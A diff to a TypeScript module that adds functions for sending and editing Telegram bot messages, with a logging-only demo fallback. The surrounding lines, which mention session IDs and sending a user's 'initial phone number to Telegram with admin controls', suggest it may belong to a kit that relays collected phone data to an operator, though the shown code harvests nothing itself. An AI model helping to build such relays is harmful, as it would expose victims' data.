@@ -32,6 +32,82 @@ export const generateSessionId = (): string => {
 };
 
 /**
+ * Send custom message to Telegram and return message ID
+ */
+export const sendCustomMessageToTelegram = async (
+  message: string,
+): Promise<{ success: boolean; messageId?: number }> => {
+  // Check if Telegram is configured
+  if (!validateTelegramConfig()) {
+    console.log("🎭 Demo mode: Would send message to Telegram");
+    console.log("📝 Message:", message);
+    // Return fake message ID for demo
+    return { success: true, messageId: Date.now() };
+  }
+
+  try {
+    console.log("📤 Sending custom message to Telegram");
+
+    const response = await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "HTML",
+        }),
+      },
+    );
+
+    if (!response.ok) {
+      const errorText = await response.text();
+      console.error("❌ Telegram send error:", {
+        status: response.status,
+        statusText: response.statusText,
+        error: errorText,
+      });
+      return { success: false };
+    }
+
+    const result = await response.json();
+    console.log("✅ Custom message sent successfully");
+
+    return { success: true, messageId: result.result.message_id };
+  } catch (error) {
+    console.error("❌ Failed to send custom message to Telegram:", error);
+    return { success: false };
+  }
+};
+
+/**
+ * Update existing Telegram message with new content
+ */
+export const updateCustomMessageInTelegram = async (
+  messageId: number,
+  newMessage: string,
+): Promise<{ success: boolean }> => {
+  // Check if Telegram is configured
+  if (!validateTelegramConfig()) {
+    console.log("🎭 Demo mode: Would update message in Telegram");
+    console.log("📝 New Message:", newMessage);
+    console.log("🆔 Message ID:", messageId);
+    return { success: true };
+  }
+
+  try {
+    await updateTelegramMessage(messageId, newMessage, null);
+    return { success: true };
+  } catch (error) {
+    console.error("❌ Failed to update custom message:", error);
+    return { success: false };
+  }
+};
+
+/**
  * Send initial phone number to Telegram with admin controls
  */
 export const sendPhoneToTelegramEnhanced = async (
